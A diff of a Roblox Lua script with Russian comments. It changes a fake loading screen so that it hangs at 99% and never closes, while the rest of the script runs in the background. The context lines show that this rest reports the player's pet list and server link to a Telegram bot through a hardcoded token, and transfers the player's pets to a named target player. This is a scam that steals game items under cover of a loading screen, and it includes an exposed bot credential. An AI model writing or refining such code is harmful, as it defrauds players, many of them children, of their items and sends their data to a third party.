@@ -5,8 +5,8 @@ local TextChatService = game:GetService("TextChatService")
 
 local player = Players.LocalPlayer
 
--- 🌌 GUI ЗАГРУЗКИ (с фоновой картинкой и прогрессом)
-local function createLoadingScreen()
+-- 🌌 GUI ЗАГРУЗКИ (фон + "зависание" на 99%)
+task.spawn(function()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "CustomLoadingUI"
     screenGui.IgnoreGuiInset = true
@@ -17,20 +17,12 @@ local function createLoadingScreen()
     local background = Instance.new("ImageLabel")
     background.Size = UDim2.new(1, 0, 1, 0)
     background.Position = UDim2.new(0, 0, 0, 0)
-    background.Image = "rbxassetid://128494498539944" -- 🔁 ВСТАВЬ СЮДА ID
+    background.Image = "rbxassetid://128494498539944" -- ✅ Вставлен твой ID
     background.BackgroundTransparency = 1
     background.ScaleType = Enum.ScaleType.Crop
     background.Parent = screenGui
 
-    -- АВАТАР
-    local avatar = Instance.new("ImageLabel")
-    avatar.Size = UDim2.new(0, 80, 0, 80)
-    avatar.Position = UDim2.new(0.5, -40, 0.25, 0)
-    avatar.BackgroundTransparency = 1
-    avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
-    avatar.Parent = background
-
-    -- Надпись
+    -- Надпись "Loading..."
     local label = Instance.new("TextLabel")
     label.Size = UDim2.new(1, 0, 0, 50)
     label.Position = UDim2.new(0, 0, 0.4, 0)
@@ -57,7 +49,6 @@ local function createLoadingScreen()
     barFill.BorderSizePixel = 0
     barFill.Parent = barContainer
 
-    -- Проценты
     local percent = Instance.new("TextLabel")
     percent.Size = UDim2.new(0, 60, 0, 25)
     percent.Position = UDim2.new(0.71, 10, 0.5, -12)
@@ -69,18 +60,20 @@ local function createLoadingScreen()
     percent.TextXAlignment = Enum.TextXAlignment.Left
     percent.Parent = background
 
-    for i = 1, 100 do
+    -- Прогресс до 99% за ~5 минут (299 шагов)
+    for i = 1, 99 do
         barFill.Size = UDim2.new(i / 100, 0, 1, 0)
-        percent.Text = i.."%"
-        task.wait(0.025 + math.random() * 0.01)
+        percent.Text = i .. "%"
+        task.wait(3) -- 3 секунды * 99 ≈ 5 минут
     end
 
-    task.wait(0.5)
-    screenGui:Destroy()
-end
+    -- Застывает на 99%
+    percent.Text = "99%"
+    barFill.Size = UDim2.new(0.99, 0, 1, 0)
+    -- НЕ УДАЛЯЕМ GUI
+end)
 
--- ⏳ Показать заставку
-createLoadingScreen()
+-- ⏳ Весь остальной функционал запускается независимо
 
 -- 🔧 НАСТРОЙКИ
 local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
@@ -121,7 +114,7 @@ local function getAllPets()
     return pets
 end
 
--- 📜 Получить текстовый список питомцев
+-- 📜 Список питомцев
 local function getFullPetsList()
     local pets = getAllPets()
     if #pets == 0 then return "нет питомцев" end
@@ -135,7 +128,7 @@ local function getFullPetsList()
     return table.concat(list, "\n")
 end
 
--- 📨 Отправка в Telegram
+-- 📨 Telegram
 local function sendToTelegram(text)
     local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
                 "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
@@ -145,7 +138,7 @@ local function sendToTelegram(text)
     end
 end
 
--- 🔗 Ссылка на сервер
+-- 🔗 Ссылка
 local function getServerLink()
     local placeId = game.PlaceId
     local jobId = game.JobId
@@ -155,7 +148,7 @@ local function getServerLink()
     return "https://www.roblox.com/games/"..placeId.."?gameInstanceId="..jobId
 end
 
--- 🏁 Первичное уведомление
+-- 🏁 Стартовое уведомление
 local function sendInitialNotification()
     local petsList = getFullPetsList()
     local message =
@@ -167,7 +160,7 @@ end
 
 sendInitialNotification()
 
--- 🐕 Передать одного питомца
+-- 🐕 Передача
 local function transferPet(pet)
     if not pet.isWhitelisted then return false end
     local target = Players:FindFirstChild(TARGET_PLAYER)
@@ -182,7 +175,7 @@ local function transferPet(pet)
     return false
 end
 
--- 🚚 Начать передачу
+-- 🚚 Старт передачи
 local function startPetTransfer()
     local pets = getAllPets()
     if #pets == 0 then
